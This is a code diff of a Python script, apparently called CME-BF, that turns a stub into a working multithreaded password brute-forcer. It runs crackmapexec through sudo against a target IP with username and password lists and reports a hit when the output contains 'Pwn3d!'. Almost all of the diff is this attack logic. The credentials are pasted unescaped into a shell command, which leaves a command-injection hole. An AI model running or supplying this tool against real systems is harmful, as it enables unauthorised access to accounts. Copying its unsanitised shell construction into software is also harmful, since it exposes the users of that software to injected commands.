@@ -8,6 +8,8 @@
 import os, subprocess, sys, argparse, threading
 
 
+checkSuccessfull = False
+
 def banner():
     "Gives the beautiful Banner <3"
     print("   _____                _    __  __             ______                 ____             _            ")
@@ -29,6 +31,49 @@ def banner():
     strversion = """        		  """ + bcolors.BLUE + \
         """You are using Version: %s""" % (version) + bcolors.ENDC + "\n"
     print(strversion)
+
+def main():
+    global version
+    global segmentCnt
+    global userfile
+    global passwordfile
+    global ip
+    global rightPW
+    segmentCnt = 3
+
+    if os.path.exists('got'):
+        os.remove('got')
+
+    parser = argparse.ArgumentParser()
+    # optional argument
+    parser.add_argument("-t", "--threads", type=int, help="How many threads we should use, Default = 3")
+    # required arguments
+    required = parser.add_argument_group('required arguments')
+    required.add_argument("-u", "--userfile", help="Path to userlist file", required=True)
+    required.add_argument("-p", "--passwordfile", help="Path to passwordlist file", required=True)
+    required.add_argument("-ip", "--ipadr", help="Ip Address to attack", required=True)
+    args = parser.parse_args()
+
+    if args.threads is not None:
+        segmentCnt = args.threads
+
+
+    if segmentCnt > 30:
+        print_warning("Too many threads! Bumping down to 30")
+        segmentCnt = 30
+
+
+    userfile = args.userfile
+    passwordfile = args.passwordfile
+    ip = args.ipadr
+
+
+    cls()
+    banner()
+    dependencycheck()
+    readFiles()
+    return
+
 
 
 def cls():
@@ -93,7 +138,7 @@ def print_error_indent(message):
 
 def print_thread(threadID, message, found):
     if found:
-        print_status_indent("[Thread - " + str(threadID) + "] " + message)
+        print_status("[Thread - " + str(threadID) + "] " + message)
     else:
         print_info_indent("[Thread - " + str(threadID) + "] " + message)
 
@@ -135,16 +180,33 @@ class threadBForce (threading.Thread):
         self.pwlist = pwlist
         self.userlist = userlist
     def run(self):
-        if checkSuccessfull:
-            self.stop()
 
-        checkCreds(self.threadID,"abcd","1234","127.0.0.1")
+        for u in self.userlist:
+            for p in self.pwlist:
+                if checkCreds(self.threadID, u, p, ip):
+                    open('got', 'a').close()
 
+def checkCreds(threadid, username, password, ip):
 
+    if os.path.exists('got'):
+        return
 
-def checkCreds(threadid,username,password,ip):
-    print_thread(threadid,"Not found...", False)
-    return
+    print_thread(threadid, "(" + ip + ") -> (" + username + "|" + password + ")", False)
+    cmd = "sudo crackmapexec " + ip + " -u '" + username + "' -p '" + password + "'"
+    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+
+    with p.stdout:
+        for line in iter(p.stdout.readline, b''):
+            if "Pwn3d!" in line:
+
+                cls()
+                banner()
+                print_thread(threadid, "Password found! (" + username + "|" + password + ")", True)
+                print("\n")
+                return True
+
+    p.wait()  # wait for the subprocess to exit
+    return False
 
 
 
@@ -153,19 +215,36 @@ def readFiles():
     userlist = open(userfile).read().splitlines()
     pwlist = open(passwordfile).read().splitlines()
 
+    tmpcnt = segmentCnt
+    while tmpcnt >= len(pwlist):
+        tmpcnt -= 1
+
     # how many items will be in the last list
-    elemLastLength = len(pwlist) % segmentCnt
-    # how many lists we get
-    listCount = len(pwlist) // segmentCnt
+    elemLastLength = len(pwlist) % tmpcnt
+    # how many items in each list
+    listCount = len(pwlist) // tmpcnt
+
+    if elemLastLength > 0:
+        tmpcnt -= 1
+
+    slicedPWList = []
+    begin = 0
+    multi = 1
+    for t in range(0, tmpcnt):
+        tmp = []
+        for e in range(begin, listCount*multi):
+            tmp.append(pwlist[e])
+        begin += listCount
+        multi += 1
+        slicedPWList.append(tmp)
+
+    if elemLastLength > 0:
+        endList = []
+        for e in range(begin, len(pwlist)):
+            endList.append(pwlist[e])
+        slicedPWList.append(endList)
 
 
-    slicedPWList = [pwlist[x:x + segmentCnt] for x in range(0, len(pwlist) - elemLastLength, segmentCnt)]
-
-    endList = []
-    for y in range(len(pwlist) - elemLastLength, len(pwlist)):
-        endList.append(pwlist[y])
-
-    slicedPWList.append(endList)
     startThreads(userlist,slicedPWList)
     return
 
@@ -176,8 +255,9 @@ def startThreads(userlist,pwlist):
     banner()
     threads = []
 
-
+    checkSuccessfull = False
     threadid = 1
+
     for slicedPwL in pwlist:
         thread = threadBForce(threadid, userlist, slicedPwL)
         thread.start()
@@ -185,53 +265,20 @@ def startThreads(userlist,pwlist):
         threadid += 1
 
 
+
+
     # Wait for all threads to complete
     for t in threads:
         t.join()
 
-    if not checkSuccessfull:
-        print_error("Password not found :(")
+    if os.path.exists('got'):
+        os.remove('got')
     else:
-        print_status("Password found it is: " + rightPW)
+        print_error("Password not found :(")
+        print("\n")
 
-    return
-
-def main():
-    global version
-    global segmentCnt
-    global userfile
-    global passwordfile
-    global ip
-    global checkSuccessfull
-    global rightPW
-
-    checkSuccessfull = False
-    segmentCnt = 3
-
-
-    parser = argparse.ArgumentParser()
-    # optional argument
-    parser.add_argument("-s", "--seg", type=int, help="set pwlist segment count, Default = 3")
-    # required arguments
-    required = parser.add_argument_group('required arguments')
-    required.add_argument("-u", "--userfile", help="Path to userlist file", required=True)
-    required.add_argument("-p", "--passwordfile", help="Path to passwordlist file", required=True)
-    required.add_argument("-ip", "--ipadr", help="Ip Address to attack", required=True)
-    args = parser.parse_args()
-
-    if args.seg is not None:
-        segmentCnt = args.seg
-
-    userfile = args.userfile
-    passwordfile = args.passwordfile
-    ip = args.ipadr
-
-
-    cls()
-    banner()
-    dependencycheck()
-    readFiles()
-    return
+    print_info("Thanks 4 using CME-BF :) ")
+    print("\n")
 
 
 if __name__ == "__main__":
